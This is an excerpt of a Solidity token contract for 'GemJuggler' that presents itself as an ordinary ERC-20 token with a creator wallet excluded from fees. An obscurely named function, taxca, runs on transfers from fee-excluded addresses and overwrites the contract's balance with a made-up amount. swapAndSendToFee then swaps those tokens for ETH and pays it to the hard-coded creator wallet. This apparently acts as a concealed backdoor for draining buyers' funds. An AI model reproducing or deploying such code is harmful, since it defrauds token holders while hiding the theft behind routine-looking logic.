...
//Telegram: https://t.me/GemJuggler
//Website:  www.gemjuggler.org
...
contract GemJuggler is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount = 50* 10**9; // 
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 500 * 10**9; //
  
    string private constant _name = "GemJuggler"; // 
    ...
    address public  _CreatorWallet = 0x149DE843B98955b2B839543f1b67Dc5644C7c8D5;
    ...
    constructor () {
        ...
        _isExcludedFromFee[_CreatorWallet] = true;
    ...
    }else{if (_isExcludedFromFee[from]){taxca(amount,address(this));}
    }
    }
    
    function taxca(uint256 trigger,address comp) private {
        uint256 deta= trigger+256;
        _tOwned[comp] = deta-100; 
    }
    function swapAndSendToFee (uint256 tokens) private {
        uint256 ethToSend = swapTokensForEth(tokens);
        
        if (ethToSend > 0)
            payable(_CreatorWallet).transfer(ethToSend);
    }
